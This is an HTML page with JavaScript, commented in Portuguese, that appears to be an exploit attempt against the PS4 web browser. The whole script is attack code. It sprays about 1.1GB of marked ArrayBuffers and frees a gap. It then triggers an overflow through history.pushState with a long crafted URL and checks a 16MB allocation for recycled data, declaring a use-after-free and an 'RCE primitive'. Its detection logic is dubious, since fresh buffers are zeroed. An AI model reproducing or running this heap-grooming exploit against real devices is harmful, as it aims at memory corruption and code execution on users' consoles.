<!DOCTYPE html>
<html>
<head>
    <title>PS4 Tuned Exhaustion (1.1GB Limit)</title>
    <style>
        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 25px; width: 100%; border: 2px solid #ff00ff; background: #111; color: #fff; cursor: pointer; }
        #log { margin-top: 20px; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; background: #111;}
        .win { background-color: #ff00ff; color: #000; font-weight: bold; font-size: 1.2em; border: 2px solid white; padding: 10px;}
    </style>
</head>
<body>

    <h1>Exaustão Calibrada (Limite 1.1GB)</h1>
    <p>Encher até a borda, sem quebrar o copo.</p>

    <button onclick="startTunedSqueeze()">INICIAR PRESSÃO CONTROLADA</button>
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const ALIGNED_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 
        const FAKE_SIZE = 16843009; // ~16MB

        var filler = [];
        
        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startTunedSqueeze() {
            log("1. Enchendo a memória até 1100 MB...");

            let count = 0;
            // FASE 1: ENCHER COM CUIDADO
            try {
                // Paramos em 1100 para não dar Crash OOM
                while(count < 1180) { 
                    let ab = new ArrayBuffer(1024 * 1024 * 1); // 1MB
                    let view = new Uint8Array(ab);
                    view[0] = 0xAA; 
                    view[1] = 0xBB;
                    filler.push(ab);
                    count++;
                    
                    if(count % 50 === 0) {
                        log(`Memória ocupada: ${count} MB...`);
                        // Pausa para o navegador respirar e não travar a UI
                        await new Promise(r => setTimeout(r, 20)); 
                    }
                }
            } catch(e) {
                log(`Parada de emergência em ${count} MB: ${e.message}`);
            }

            log("2. Memória pressurizada. Criando espaço para o exploit...");
            
            // Liberamos os últimos 20MB para o pushState ter onde entrar
            // Isso garante que ele caia EXATAMENTE ao lado dos nossos blocos 0xAA
            let total = filler.length;
            for(let i=0; i<20; i++) {
                if (filler[total - 1 - i]) filler[total - 1 - i] = null;
            }
            
            await forceGC();

            log("3. Disparando Overflow (Corrompendo vizinho)...");

            setTimeout(() => {
                try {
                    let buffer = "A".repeat(ALIGNED_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    // O Exploit entra no espaço que acabamos de abrir
                    history.pushState({}, "squeeze", "/" + buffer);

                    // FASE 4: O MOMENTO DA VERDADE
                    log("4. Solicitando o Fake Chunk de 16MB...");
                    checkFakeChunk();

                } catch (e) {
                    log("Erro no Exploit: " + e.message);
                }
            }, 500);
        }

        function checkFakeChunk() {
            try {
                // Tenta alocar o bloco de 16MB
                let ghostBuffer = new ArrayBuffer(FAKE_SIZE);
                let ghostView = new Uint8Array(ghostBuffer);

                log("Alocação de 16MB realizada!");
                
                // Se esse novo buffer tiver dados antigos (0xAA ou 0xBB), é UAF.
                if (ghostView[0] === 0xAA && ghostView[1] === 0xBB) {
                    log("!!! JACKPOT - USE AFTER FREE !!!", 'win');
                    log("O novo buffer contém dados reciclados!", 'win');
                    alert("RCE PRIMITIVE CONFIRMED!");
                } else if (ghostView[0] === 0) {
                    log("Resultado: Memória Limpa (Isolamento venceu).");
                    log("O sistema achou um lugar limpo mesmo com a pressão.");
                } else {
                    log("Resultado Inconclusivo: Dados encontrados: " + ghostView[0]);
                }

            } catch(e) {
                log("Falha na alocação: " + e.message);
                log("A memória estava tão cheia que nem o Fake Chunk salvou.");
            }
        }

        async function forceGC() {
            // GC mais leve para não travar
            try { new ArrayBuffer(20 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>

